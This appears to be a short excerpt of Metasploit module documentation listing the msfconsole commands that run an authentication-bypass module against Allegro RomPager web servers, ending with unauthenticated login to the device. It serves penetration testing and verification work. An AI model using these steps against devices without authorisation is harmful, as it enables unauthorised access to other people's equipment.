## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/admin/http/allegro_rompager_auth_bypass```
  3. Do: ```set rhost <ip>```
  4. Do: ```set rport <port>```
  5. Do: ```run```
  6. You should be able to login into the device without authentication
